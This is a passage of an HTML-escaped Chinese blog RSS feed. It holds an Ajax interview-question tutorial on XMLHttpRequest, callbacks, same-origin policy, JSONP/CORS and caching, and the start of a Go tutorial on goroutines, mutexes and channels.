-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;open()&lt;/strong&gt;(&lt;strong&gt;String method,String url,boolean asynch&lt;/strong&gt;,String username,String password)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;send(content)&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;setRequestHeader(String header,String value)&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;getAllResponseHeaders()&lt;/li&gt;
-&lt;li&gt;getResponseHeader(String header)&lt;/li&gt;
-&lt;li&gt;abort()&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;常用的方法就是黑色粗体的前三个&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;open()：该方法创建http请求&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;第一个参数是指定提交方式(post、get)&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;第二个参数是指定要提交的地址是哪&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;第三个参数是指定是异步还是同步(true表示异步，false表示同步)&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;第四和第五参数在http认证的时候会用到。是可选的&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;setRequestHeader(String header,String value)：设置消息头（使用post方式才会使用到，get方法并不需要调用该方法）&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;send(content)：发送请求给服务器&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;如果是get方式，并不需要填写参数，或填写null&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;如果是post方式，把要提交的参数写上去&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;属性&quot;&gt;&lt;strong&gt;属性&lt;/strong&gt;&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;onreadystatechange：请求状态改变的事件触发器（readyState变化时会调用此方法），一般用于指定回调函数&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;readyState：请求状态readyState一改变，回调函数被调用，它有5个状态&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;0：未初始化&lt;/li&gt;
-&lt;li&gt;1：open方法成功调用以后&lt;/li&gt;
-&lt;li&gt;2：服务器已经应答客户端的请求&lt;/li&gt;
-&lt;li&gt;3：交互中。Http头信息已经接收，响应数据尚未接收。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;4：完成。数据接收完成&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170517181407343?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;responseText：服务器返回的文本内容&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;responseXML：服务器返回的兼容DOM的XML内容&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;status：服务器返回的状态码&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;statusText：服务器返回状态码的文本信息&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;上面有两个地方都提及了回调函数，回调函数是什么？？&lt;/p&gt;
-&lt;p&gt;回调函数就是&lt;strong&gt;接收服务器返回的内容！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170517181326031?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
-&lt;h2 id=&quot;ajax的实现流程是怎样的&quot;&gt;Ajax的实现流程是怎样的？&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;Ajax的实现流程是怎样的？&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;&lt;li&gt;(1)创建XMLHttpRequest对象,也就是创建一个异步调用对象.&lt;/li&gt;
-&lt;li&gt;(2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息.&lt;/li&gt;
-&lt;li&gt;(3)设置响应HTTP请求状态变化的函数.&lt;/li&gt;
-&lt;li&gt;(4)发送HTTP请求.&lt;/li&gt;
-&lt;li&gt;(5)获取异步调用返回的数据.&lt;/li&gt;
-&lt;li&gt;(6)使用JavaScript和DOM实现局部刷新.&lt;/li&gt;
-&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;13&quot;&gt;
-&lt;pre class=&quot;sourceCode javascript&quot;&gt;
-&lt;code class=&quot;sourceCode javascript&quot;&gt;
-
-
-    &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt;
-
-        &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; httpRequest&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;at&quot;&gt;checkUsername&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
-
-            &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;XMLHttpRequest&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
-
-                &lt;span class=&quot;co&quot;&gt;//在IE6以上的版本以及其他内核的浏览器(Mozilla)等&lt;/span&gt;
-                httpRequest &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;at&quot;&gt;XMLHttpRequest&lt;/span&gt;()&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-            &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;cf&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;ActiveXObject&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
-
-                &lt;span class=&quot;co&quot;&gt;//在IE6以下的版本&lt;/span&gt;
-                httpRequest &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;at&quot;&gt;ActiveXObject&lt;/span&gt;()&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-            &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
-
-
-            &lt;span class=&quot;co&quot;&gt;//创建http请求&lt;/span&gt;
-            &lt;span class=&quot;va&quot;&gt;httpRequest&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;Servlet1&quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;true&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-
-            &lt;span class=&quot;co&quot;&gt;//因为我使用的是post方式，所以需要设置消息头&lt;/span&gt;
-            &lt;span class=&quot;va&quot;&gt;httpRequest&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;setRequestHeader&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;Content-type&quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-
-            &lt;span class=&quot;co&quot;&gt;//指定回调函数&lt;/span&gt;
-            &lt;span class=&quot;va&quot;&gt;httpRequest&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; response22&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-
-            &lt;span class=&quot;co&quot;&gt;//得到文本框的数据&lt;/span&gt;
-            &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; name &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;getElementById&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;).&lt;span class=&quot;at&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-
-            &lt;span class=&quot;co&quot;&gt;//发送http请求，把要检测的用户名传递进去&lt;/span&gt;
-            &lt;span class=&quot;va&quot;&gt;httpRequest&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;send&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username=&quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; name)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-
-        &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
-
-        &lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;at&quot;&gt;response22&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
-
-            &lt;span class=&quot;co&quot;&gt;//判断请求状态码是否是4【数据接收完成】&lt;/span&gt;
-            &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;httpRequest&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;readyState&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
-
-                &lt;span class=&quot;co&quot;&gt;//再判断状态码是否为200【200是成功的】&lt;/span&gt;
-                &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;httpRequest&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;200&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
-
-                    &lt;span class=&quot;co&quot;&gt;//得到服务端返回的文本数据&lt;/span&gt;
-                    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; text &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;httpRequest&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-
-                    &lt;span class=&quot;co&quot;&gt;//把服务端返回的数据写在div上&lt;/span&gt;
-                    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; div &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;getElementById&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;result&quot;&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-                    &lt;span class=&quot;va&quot;&gt;div&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;innerText&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; text&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
-                &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
-
-            &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;ajax请求总共有多少种callback&quot;&gt;AJAX请求总共有多少种CALLBACK&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;AJAX请求总共有多少种CALLBACK&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Ajax请求总共有&lt;strong&gt;八种&lt;/strong&gt;Callback&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;onSuccess&lt;/li&gt;
-&lt;li&gt;onFailure&lt;/li&gt;
-&lt;li&gt;onUninitialized&lt;/li&gt;
-&lt;li&gt;onLoading&lt;/li&gt;
-&lt;li&gt;onLoaded&lt;/li&gt;
-&lt;li&gt;onInteractive&lt;/li&gt;
-&lt;li&gt;onComplete&lt;/li&gt;
-&lt;li&gt;onException&lt;/li&gt;
-&lt;/ul&gt;&lt;h2 id=&quot;xmlhttprequest对象在ie和firefox中创建方式有没有不同&quot;&gt;XMLHttpRequest对象在IE和Firefox中创建方式有没有不同。&lt;/h2&gt;
-&lt;p&gt;有，IE中通过new ActiveXObject()得到，Firefox中通过newXMLHttpRequest()得到&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;当然了，我们一般使用jquery封装好的ajax方法，那就没有那么麻烦了。&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;h2 id=&quot;ajax有哪些有点和缺点&quot;&gt;AJAX有哪些有点和缺点？&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;AJAX有哪些有点和缺点？&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;优点：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;1、最大的一点是页面无刷新，用户的体验非常好。&lt;/li&gt;
-&lt;li&gt;2、使用异步方式与服务器通信，具有更加迅速的响应能力。&lt;/li&gt;
-&lt;li&gt;3、可以把以前一些服务器负担的工作转嫁到客户端，利用客户端闲置的能力来处理，减轻服务器和带宽的负担，节约空间和宽带租用成本。并且减轻服务器的负担，ajax的原则是“按需取数据”，可以最大程度的减少冗余请求，和响应对服务器造成的负担。&lt;/li&gt;
-&lt;li&gt;4、基于标准化的并被广泛支持的技术，不需要下载插件或者小程序。&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;缺点：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;1、ajax不支持浏览器back按钮。&lt;/li&gt;
-&lt;li&gt;2、安全问题 AJAX暴露了与服务器交互的细节。&lt;/li&gt;
-&lt;li&gt;3、对搜索引擎的支持比较弱。&lt;/li&gt;
-&lt;li&gt;4、破坏了程序的异常机制。&lt;/li&gt;
-&lt;li&gt;5、不容易调试。&lt;/li&gt;
-&lt;/ul&gt;&lt;h2 id=&quot;请解释一下-javascript-的同源策略&quot;&gt;请解释一下 JavaScript 的同源策略。&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;请解释一下 JavaScript 的同源策略。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。所谓同源指的是：协议，域名，端口相同，&lt;strong&gt;同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性&lt;/strong&gt;。&lt;/p&gt;
-&lt;h2 id=&quot;阐述一下异步加载js&quot;&gt;阐述一下异步加载JS。&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;阐述一下异步加载JS。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ol&gt;&lt;li&gt;异步加载的方案： 动态插入 script 标签&lt;/li&gt;
-&lt;li&gt;通过 ajax 去获取 js 代码，然后通过 eval 执行&lt;/li&gt;
-&lt;li&gt;script 标签上添加 defer 或者 async 属性&lt;/li&gt;
-&lt;li&gt;创建并插入 iframe，让它异步执行 js&lt;/li&gt;
-&lt;/ol&gt;&lt;p&gt;参考资料：&lt;/p&gt;
-&lt;h2 id=&quot;如何解决跨域问题&quot;&gt;如何解决跨域问题?&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;如何解决跨域问题?&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;理解跨域的概念：协议、域名、端口都相同才同域，否则都是跨域&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;出于安全考虑，服务器不允许ajax跨域获取数据，但是可以跨域获取文件内容。&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;所以基于这一点，可以动态创建script标签，使用标签的src属性访问js文件的形式获取js脚本，并且这个js脚本中的内容是函数调用，该函数调用的参数是服务器返回的数据，为了获取这里的参数数据，需要事先在页面中定义回调函数，在回调函数中处理服务器返回的数据，&lt;strong&gt;【JSONP】&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;在后端上配置可跨域&lt;strong&gt;【CORS方式】&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;前端ajax请求的是本地接口，本地接口接收到请求后向实际的接口请求数据，然后再将信息返回给前端&lt;strong&gt;【代理方式】&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;AJAX跨域的问题可参考：&lt;/p&gt;
-&lt;h2 id=&quot;ajax-解决浏览器缓存问题&quot;&gt;Ajax 解决浏览器缓存问题？&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;Ajax 解决浏览器缓存问题？&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;&lt;li&gt;1、在ajax发送请求前加上 anyAjaxObj.setRequestHeader(&quot;If-Modified-Since&quot;,&quot;0&quot;)。&lt;/li&gt;
-&lt;li&gt;2、在ajax发送请求前加上 anyAjaxObj.setRequestHeader(&quot;Cache-Control&quot;,&quot;no-cache&quot;)。&lt;/li&gt;
-&lt;li&gt;3、在URL后面加上一个随机数： &quot;fresh=&quot; + Math.random();。&lt;/li&gt;
-&lt;li&gt;4、在URL后面加上时间戳：&quot;nowtime=&quot; + new Date().getTime();。&lt;/li&gt;
-&lt;li&gt;5、如果是使用jQuery，直接这样就可以了 $.ajaxSetup({cache:false})。这样页面的所有ajax都会执行这条语句就是不需要保存缓存记录。&lt;/li&gt;
-&lt;/ul&gt;&lt;hr/&gt;&lt;blockquote readability=&quot;6&quot;&gt;
-&lt;p&gt;如果文章有错的地方欢迎指正，大家互相交流。&lt;strong&gt;习惯在微信看技术文章的同学，可以关注微信公众号:Java3y&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-</description>
-<pubDate>Wed, 14 Feb 2018 13:18:00 +0000</pubDate>
-<dc:creator>Java3y</dc:creator>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/Java3y/p/8448921.html</dc:identifier>
-</item>
-<item>
-<title>goroutine - 宁生信</title>
-<link>http://www.cnblogs.com/gregoryli/p/8448903.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/gregoryli/p/8448903.html</guid>
-<description>&lt;h2 id=&quot;进程和线程&quot;&gt;进程和线程&lt;/h2&gt;
-&lt;p&gt;进程是程序在操作系统中的一次执行过程，系统进行资源分配和调度的一个独立单位。&lt;/p&gt;
-&lt;p&gt;线程是进程的一个执行实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位。&lt;/p&gt;
-&lt;p&gt;一个进程可以创建和撤销多个线程;同一个进程中的多个线程之间可以并发执行.&lt;/p&gt;
-&lt;h2 id=&quot;并发和并行&quot;&gt;并发和并行&lt;/h2&gt;
-&lt;p&gt;多线程程序在一个核的cpu上运行，就是并发&lt;/p&gt;
-&lt;p&gt;多线程程序在多个核的cpu上运行，就是并行&lt;/p&gt;
-&lt;h2 id=&quot;协程和线程&quot;&gt;协程和线程&lt;/h2&gt;
-&lt;p&gt;协程：独立的栈空间，共享堆空间，调度由用户自己控制，本质上有点类似于用户级线程，这些用户级线程的调度也是自己实现的&lt;/p&gt;
-&lt;p&gt;线程：一个线程上可以跑多个协程，协程是轻量级的线程。&lt;/p&gt;
-&lt;h2 id=&quot;goroutine调度模型&quot;&gt;goroutine调度模型&lt;/h2&gt;
-&lt;p&gt;简单的例子&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;time&quot;&lt;/span&gt;
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; test() {
-   &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; i &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-      fmt.Println(i)
-      time.Sleep(time.Second*&lt;span class=&quot;dv&quot;&gt;5&lt;/span&gt;)
-      i++
-   }
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-   &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; test()
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-      fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;i' running in main&quot;&lt;/span&gt;)
-      time.Sleep(time.Second)
-   }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;设置golang运行的cpu核数&quot;&gt;设置golang运行的cpu核数&lt;/h2&gt;
-&lt;p&gt;go1.8版本以上默认设置了&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-    &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-    &lt;span class=&quot;st&quot;&gt;&quot;runtime&quot;&lt;/span&gt;
-)
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-    num := runtime.NumCPU()
-    runtime.GOMAXPROCS(num)
-    fmt.Println(num)
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;不同goroutine之间通讯&quot;&gt;不同goroutine之间通讯&lt;/h2&gt;
-&lt;p&gt;全局变量和锁同步&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;14&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-   &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;time&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;sync&quot;&lt;/span&gt;
-)
-
-&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; (
-   m = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;map&lt;/span&gt;[&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;]&lt;span class=&quot;dt&quot;&gt;uint64&lt;/span&gt;)
-   lock sync.Mutex
-)
-
-&lt;span class=&quot;kw&quot;&gt;type&lt;/span&gt; task &lt;span class=&quot;kw&quot;&gt;struct&lt;/span&gt; {
-   n &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; calc(t *task) {
-   &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; sum &lt;span class=&quot;dt&quot;&gt;uint64&lt;/span&gt;
-   sum = &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i:=&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;;i&amp;lt;t.n;i++{
-      sum *= &lt;span class=&quot;dt&quot;&gt;uint64&lt;/span&gt;(i)
-   }
-   fmt.Println(t.n,sum)
-   lock.Lock()
-   m[t.n] = sum
-   lock.Unlock()
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main()  {
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i :=&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;i&amp;lt;&lt;span class=&quot;dv&quot;&gt;20&lt;/span&gt;;i++{
-      t := &amp;amp;task{n:i}
-      &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; calc(t)
-   }
-   time.Sleep(&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt; * time.Second)
-   &lt;span class=&quot;co&quot;&gt;/*&lt;/span&gt;
-&lt;span class=&quot;co&quot;&gt;   lock.Lock()&lt;/span&gt;
-&lt;span class=&quot;co&quot;&gt;   for k,v := range m{&lt;/span&gt;
-&lt;span class=&quot;co&quot;&gt;      fmt.Printf(&quot;%d!=%v\n&quot;,k,v)&lt;/span&gt;
-&lt;span class=&quot;co&quot;&gt;   }&lt;/span&gt;
-&lt;span class=&quot;co&quot;&gt;   lock.Unlock()*/&lt;/span&gt;
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Channel&lt;/p&gt;
-&lt;h2 id=&quot;channel&quot;&gt;channel&lt;/h2&gt;
-&lt;p&gt;a. 类似unix中管道（pipe）&lt;/p&gt;
-&lt;p&gt;b. 先进先出&lt;/p&gt;
-&lt;p&gt;c. 线程安全，多个goroutine同时访问，不需要加锁&lt;/p&gt;
-&lt;p&gt;d. channel是有类型的，一个整数的channel只能存放整数&lt;/p&gt;
-&lt;p&gt;var 变量名 chan 类型&lt;/p&gt;
-&lt;p&gt;var test chan int&lt;/p&gt;
-&lt;p&gt;var test chan string&lt;/p&gt;
-&lt;p&gt;var test chan map[string]string&lt;/p&gt;
-&lt;p&gt;var test chan stu&lt;/p&gt;
-&lt;p&gt;var test chan *stu&lt;/p&gt;
-&lt;h2 id=&quot;channel初始化&quot;&gt;channel初始化&lt;/h2&gt;
-&lt;p&gt;使用make进行初始化，比如：&lt;/p&gt;
-&lt;p&gt;var test chan int&lt;/p&gt;
-&lt;p&gt;test = make(chan int, 10)&lt;/p&gt;
-&lt;p&gt;var test chan string&lt;/p&gt;
-&lt;p&gt;test = make(chan string, 10)&lt;/p&gt;
-&lt;p&gt;从channel读取数据&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; testChan &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-testChan = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;)
-&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-a = &amp;lt;- testChan&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;向channel写入数据&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; testChan &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-testChan = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;)
